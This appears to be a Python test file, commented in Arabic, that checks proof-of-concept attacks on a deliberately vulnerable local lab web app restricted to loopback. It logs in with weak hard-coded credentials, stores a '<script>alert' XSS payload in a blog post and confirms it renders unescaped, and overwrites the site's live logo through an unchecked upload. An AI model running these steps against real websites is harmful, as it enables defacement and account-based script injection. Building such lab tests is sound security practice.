"""
test_mission_poc.py — اختبارات إثبات السيطرة (PoC) على الموقع الهدف.
كل الاختبارات داخل loopback (جهازك) فقط. الهدف يغرس قاعدة بيانات مؤقتة.
"""
import io
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "target"))
sys.path.insert(0, str(ROOT / "scanner"))

from scoped import Scope
from session import Session
import app as target
import png_util


def _setup():
    target.init_db()
    return target.app.test_client()


CLIENT = _setup()


def test_logo_route_exists():
    r = CLIENT.get("/logo")
    assert r.status_code == 200
    assert r.content_type == "image/png"
    assert len(r.data) > 0


def test_logo_initial_is_default():
    # محكم: نعيد التهيئة من الصفر فلا يعتمد على حالة قرص متبقية.
    logo = ROOT / "data" / "uploads" / "logo_current.png"
    if logo.exists():
        logo.unlink()
    target.init_db()
    assert CLIENT.get("/logo").data == png_util.default_logo()


def test_logo_reflected_in_header():
    assert b"/logo" in CLIENT.get("/").data


def test_upload_overwrites_live_logo():
    replacement = png_util.replacement_logo()
    res = CLIENT.post(
        "/upload",
        data={"file": (io.BytesIO(replacement), "logo_current.png")},
        content_type="multipart/form-data",
    )
    assert res.status_code == 200
    assert CLIENT.get("/logo").data == replacement  # أصبح شعارك حرفيًا


def test_restore_logo_to_original():
    res = CLIENT.post(
        "/upload",
        data={"file": (io.BytesIO(png_util.default_logo()), "logo_current.png")},
        content_type="multipart/form-data",
    )
    assert res.status_code == 200
    assert CLIENT.get("/logo").data == png_util.default_logo()


def _drop_posts(title: str) -> int:
    """يحذف مقالات الفحص — لا يوجد مسار حذف في /blog.

    بدون هذا كان كل تشغيل يترك صفًا: 83 صفًا مكررًا بعنوان "PoC XSS"
    تراكمت عبر 83 تشغيلًا للاختبار. نستخدم db() من الهدف نفسه لأن
    هذا ملف اختبار (مختبر) وله حق الوصول للقرص.
    """
    conn = target.db()
    cur = conn.execute("DELETE FROM posts WHERE title = ?", (title,))
    conn.commit()
    n = cur.rowcount if cur.rowcount and cur.rowcount > 0 else 0
    conn.close()
    return n


def test_stored_xss_via_weak_login_is_live():
    s = Session(Scope(mode="loopback"))
    base = "http://127.0.0.1:5001"
    st, _, body = s.post(
        base + "/login", fields={"username": "omari", "password": "user123"})
    assert "خاطئة" not in body.decode("utf-8", "replace")

    title = "PoC XSS"
    try:
        content = '<b>لوحة صغيرة</b> <script>alert("LocalLab-PoC")</script>'
        st, _, _ = s.post(base + "/blog/new",
                          fields={"title": title, "content": content})
        assert st in (200, 302)

        _, _, body = s.get(base + "/blog")
        ids = re.findall(r'href="/blog/(\d+)"', body.decode("utf-8", "replace"))
        assert ids, "المقال الجديد يجب أن يظهر في قائمة المدونة"
        pid = max(int(x) for x in ids)

        _, _, body = s.get(f"{base}/blog/{pid}")
        txt = body.decode("utf-8", "replace")
        assert "<script" in txt and "LocalLab-PoC" in txt
        assert "لوحة صغيرة" in txt
    finally:
        _drop_posts(title)
